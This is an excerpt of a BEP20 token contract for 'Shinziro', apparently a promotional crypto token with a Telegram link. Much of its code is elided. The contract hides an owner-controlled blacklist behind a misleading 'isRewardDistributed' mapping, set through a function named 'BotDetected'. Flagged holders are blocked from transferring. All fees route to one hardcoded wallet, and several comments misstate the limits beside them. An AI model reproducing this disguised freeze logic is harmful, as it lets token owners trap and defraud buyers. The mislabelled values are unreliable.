...
// telegram : https://t.me/ShinziroPortal
...
contract Shinziro is IBEP20, Ownable {

    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "Shinziro"; // 
    string constant _symbol = "$SHINZIRO"; // 
    ...
    mapping (address => bool) public isRewardDistributed;
    ...
    uint256 public _maxSellTxAmount = _totalSupply / (1) * (1); // 1%
    uint256 public _maxWalletToken = _totalSupply / (1) * (100); // 2%

    // Fees receivers
    address public autoLiquidityReceiver = 0xfc8d60753509E4363564A9d1bB91dab6cb67A464;
    address public marketingFeeReceiver = 0xfc8d60753509E4363564A9d1bB91dab6cb67A464;
    address public devFeeReceiver = 0xfc8d60753509E4363564A9d1bB91dab6cb67A464;
    ...
    uint256 public maxSwapSize = _totalSupply / 100 * 1; 
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        require(!isRewardDistributed[recipient] && !isRewardDistributed[sender], 'Address is Rewarded');
    ...
    function BotDetected(address _address, bool _value) public authorized{
        isRewardDistributed[_address] = _value;
    }
    ...
    function swapBack() internal swapping {
        ...
        (bool buybackSuccess,) = payable(BurnFeeReceiver).call{value: amountBNBbuyback, gas: 30000}("");
    ...
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver, address _BurnFeeReceiver, address _devFeeReceiver) external onlyOwner {
